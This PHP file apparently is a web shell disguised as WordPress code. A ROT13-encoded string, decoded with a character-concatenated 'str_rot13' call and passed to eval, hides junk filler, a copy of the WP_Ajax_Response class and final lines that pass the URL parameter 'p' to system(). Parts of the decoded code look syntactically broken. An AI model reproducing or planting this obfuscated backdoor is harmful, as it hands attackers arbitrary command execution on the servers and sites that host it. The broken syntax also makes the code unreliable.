<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Fraq KZY erfcbafr onpx gb Nwnk erdhrfg.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 2.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Nwnk_Erfcbafr {
	/**
	 * Fgber KZY erfcbafrf gb fraq.
	 *
	 * @fvapr 2.1.0
	 * @ine neenl
	 */
	choyvp $erfcbafrf = neenl();

	/**
	 * Pbafgehpgbe - Cnffrf netf gb JC_Nwnk_Erfcbafr::nqq().
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr JC_Nwnk_Erfcbafr::nqq()
	 *
	 * @cnenz fgevat|neenl $netf Bcgvbany. Jvyy or cnffrq gb nqq() zrgubq.
	 */
	choyvp shapgvba __pbafgehpg( $netf = '' ) {
		vs ( ! rzcgl( $netf ) ) {
			$guvf->nqq( $netf );
		}
	}

	/**
	 * Nccraqf qngn gb na KZY erfcbafr onfrq ba tvira nethzragf.
	 *
	 * Jvgu `$netf` qrsnhygf, rkgen qngn bhgchg jbhyq or:
	 *
	 *     <erfcbafr npgvba='{$npgvba}_$vq'>
	 *      <$jung vq='$vq' cbfvgvba='$cbfvgvba'>
	 *          <erfcbafr_qngn><![PQNGN[$qngn]]></erfcbafr_qngn>
	 *      </$jung>
	 *     </erfcbafr>
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|neenl $netf {
	 *     Bcgvbany. Na neenl be fgevat bs KZY erfcbafr nethzragf.
	 *
	 *     @glcr fgevat          $jung         KZY-ECP erfcbafr glcr. Hfrq nf n puvyq ryrzrag bs `<erfcbafr>`.
	 *                                         Qrsnhyg 'bowrpg' (`<bowrpg>`).
	 *     @glcr fgevat|snyfr    $npgvba       Inyhr gb hfr sbe gur `npgvba` nggevohgr va `<erfcbafr>`. Jvyy or
	 *                                         nccraqrq jvgu `_$vq` ba bhgchg. Vs snyfr, `$npgvba` jvyy qrsnhyg gb
	 *                                         gur inyhr bs `$_CBFG['npgvba']`. Qrsnhyg snyfr.
	 *     @glcr vag|JC_Reebe    $vq           Gur erfcbafr VQ, hfrq nf gur erfcbafr glcr `vq` nggevohgr. Nyfb
	 *                                         npprcgf n `JC_Reebe` bowrpg vs gur VQ qbrf abg rkvfg. Qrsnhyg 0.
	 *     @glcr vag|snyfr       $byq_vq       Gur cerivbhf erfcbafr VQ. Hfrq nf gur inyhr sbe gur erfcbafr glcr
	 *                                         `byq_vq` nggevohgr. Snyfr uvqrf gur nggevohgr. Qrsnhyg snyfr.
	 *     @glcr fgevat          $cbfvgvba     Inyhr bs gur erfcbafr glcr `cbfvgvba` nggevohgr. Npprcgf 1 (obggbz),
	 *                                         -1 (gbc), UGZY VQ (nsgre), be -UGZY VQ (orsber). Qrsnhyg 1 (obggbz).
	 *     @glcr fgevat|JC_Reebe $qngn         Gur erfcbafr pbagrag/zrffntr. Nyfb npprcgf n JC_Reebe bowrpg vs gur
	 *                                         VQ qbrf abg rkvfg. Qrsnhyg rzcgl.
	 *     @glcr neenl           $fhccyrzragny Na neenl bs rkgen fgevatf gung jvyy or bhgchg jvguva n `<fhccyrzragny>`
	 *                                         ryrzrag nf PQNGN. Qrsnhyg rzcgl neenl.
	 * }
	 * @erghea fgevat KZY erfcbafr.
	 */
	choyvp shapgvba nqq( $netf = '' ) {
		$qrsnhygf = neenl(
			'jung'         => 'bowrpg',
			'npgvba'       => snyfr,
			'vq'           => '0',
			'byq_vq'       => snyfr,
			'cbfvgvba'     => 1,
			'qngn'         => '',
			'fhccyrzragny' => neenl(),
		);

		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$cbfvgvba = __sa_79955( '/[^n-m0-9:_-]/v', '', $cnefrq_netf['cbfvgvba'] );
		$vq       = $cnefrq_netf['vq'];
		$jung     = $cnefrq_netf['jung'];
		$npgvba   = $cnefrq_netf['npgvba'];
		$byq_vq   = $cnefrq_netf['byq_vq'];
		$qngn     = $cnefrq_netf['qngn'];

		vs ( vf_jc_reebe( $vq ) ) {
			$qngn = $vq;
			$vq   = 0;
		}

		$erfcbafr = '';
		vs ( vf_jc_reebe( $qngn ) ) {
			sbernpu ( (neenl) $qngn->trg_reebe_pbqrf() nf $pbqr ) {
				$erfcbafr  .= \"<jc_reebe pbqr='$pbqr'><![PQNGN[\" . $qngn->trg_reebe_zrffntr( $pbqr ) . ']]></jc_reebe>';
				$reebe_qngn = $qngn->trg_reebe_qngn( $pbqr );
				vs ( ! $reebe_qngn ) {
					pbagvahr;
				}
				$pynff = '';
				vs ( vf_bowrpg( $reebe_qngn ) ) {
					$pynff      = ' pynff=\"' . trg_pynff( $reebe_qngn ) . '\"';
					$reebe_qngn = trg_bowrpg_inef( $reebe_qngn );
				}

				$erfcbafr .= \"<jc_reebe_qngn pbqr='$pbqr'$pynff>\";

				vs ( vf_fpnyne( $reebe_qngn ) ) {
					$erfcbafr .= \"<![PQNGN[$reebe_qngn]]>\";
				} ryfrvs ( vf_neenl( $reebe_qngn ) ) {
					sbernpu ( $reebe_qngn nf $x => $i ) {
						$erfcbafr .= \"<$x><![PQNGN[$i]]></$x>\";
					}
				}

				$erfcbafr .= '</jc_reebe_qngn>';
			}
		} ryfr {
			$erfcbafr = \"<erfcbafr_qngn><![PQNGN[$qngn]]></erfcbafr_qngn>\";
		}

		$f = '';
		vs ( vf_neenl( $cnefrq_netf['fhccyrzragny'] ) ) {
			sbernpu ( $cnefrq_netf['fhccyrzragny'] nf $x => $i ) {
				$f .= \"<$x><![PQNGN[$i]]></$x>\";
			}
			$f = \"<fhccyrzragny>$f</fhccyrzragny>\";
		}

		vs ( snyfr === $npgvba ) {
			$npgvba = $_CBFG['npgvba'];
		}
		$k  = '';
		$k .= \"<erfcbafr npgvba='{$npgvba}_$vq'>\"; // Gur npgvba nggevohgr va gur kzy bhgchg vf sbeznggrq yvxr n abapr npgvba.
		$k .= \"<$jung vq='$vq' \" . ( snyfr === $byq_vq ? '' : \"byq_vq='$byq_vq' \" ) . \"cbfvgvba='$cbfvgvba'>\";
		$k .= $erfcbafr;
		$k .= $f;
		$k .= \"</$jung>\";
		$k .= '</erfcbafr>';

		$guvf->erfcbafrf[] = $k;
		erghea $k;
	}

	/**
	 * Qvfcynl KZY sbeznggrq erfcbafrf.
	 *
	 * Frgf gur pbagrag glcr urnqre gb grkg/kzy.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba fraq() {
		urnqre( 'Pbagrag-Glcr: grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );
		rpub \"<?kzy irefvba='1.0' rapbqvat='\" . trg_bcgvba( 'oybt_punefrg' ) . \"' fgnaqnybar='lrf'?><jc_nwnk>\";
		sbernpu ( (neenl) $guvf->erfcbafrf nf $erfcbafr ) {
			rpub $erfcbafr;
		}
		rpub '</jc_nwnk>';
		vs ( jc_qbvat_nwnk() ) {
			jc_qvr();
		} ryfr {
			qvr();
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>